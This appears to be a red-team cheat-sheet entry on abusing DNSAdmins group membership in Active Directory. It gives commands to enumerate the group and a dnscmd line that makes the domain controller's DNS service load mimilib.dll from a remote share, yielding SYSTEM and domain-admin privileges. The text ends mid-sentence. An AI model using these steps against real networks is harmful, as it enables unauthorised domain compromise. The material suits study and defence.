# DNSAdmins

> Consists of abusing privileges of the DNSAdmins group. 

If we have the membership of the DNSAdmins group, that group has the capability to load an arbitrary DLL with the privileges of dns.exe (DNS service that runs with system level privileges).

If the DC is also being used as DNS (very common), we can run a DLL with system privileges on the DC, which means domain admin privs.

**Note:** DNSAdmins group should have the capability to restart the DNS service, which is not the default case but many times applied manually.

_____

### 1. Enumerate members of the DNSAdmins group

```bash
#PowerView:
Get-NetGroupMember -GroupName "DNSAdmins"

#ADModule:
Get-ADGroupMember -Identity "DNSAdmins"
```

### 2. Compromise the user account of a member of DNSAdmins group

### 3. Configure DLL using dnscmd (needs RSAT DNS)

```bash
dnscmd $DC_HOSTNAME /config /serverlevelplugindll \\$IPADDRESS\dll\mimilib.dll
#Make sure that the dll directory is readable by everyone.
```

The above command will create a new registry key inside "Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
